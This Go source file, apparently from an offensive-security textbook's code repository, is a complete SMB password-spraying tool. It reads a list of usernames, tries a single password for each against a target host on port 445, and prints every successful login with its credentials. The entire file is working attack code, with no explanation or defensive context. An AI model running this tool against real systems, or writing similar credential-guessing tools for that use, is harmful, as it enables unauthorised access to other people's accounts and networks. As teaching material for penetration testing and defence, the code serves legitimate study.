package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"

	"github.com/blackhat-go/bhg/ch-6/smb/smb"
)

func main() {
	if len(os.Args) != 5 {
		log.Fatalln("Usage: main </user/file> <password> <domain> <target_host>")
	}

	buf, err := ioutil.ReadFile(os.Args[1])
	if err != nil {
		log.Fatalln(err)
	}
	options := smb.Options{
		Password: os.Args[2],
		Domain:   os.Args[3],
		Host:     os.Args[4],
		Port:     445,
	}

	users := bytes.Split(buf, []byte{'\n'})
	for _, user := range users {
		options.User = string(user)
		session, err := smb.NewSession(options, false)
		if err != nil {
			fmt.Printf("[-] Login failed: %s\\%s [%s]\n",
				options.Domain,
				options.User,
				options.Password)
			continue
		}
		defer session.Close()
		if session.IsAuthenticated {
			fmt.Printf("[+] Success     : %s\\%s [%s]\n",
				options.Domain,
				options.User,
				options.Password)
		}
	}
}
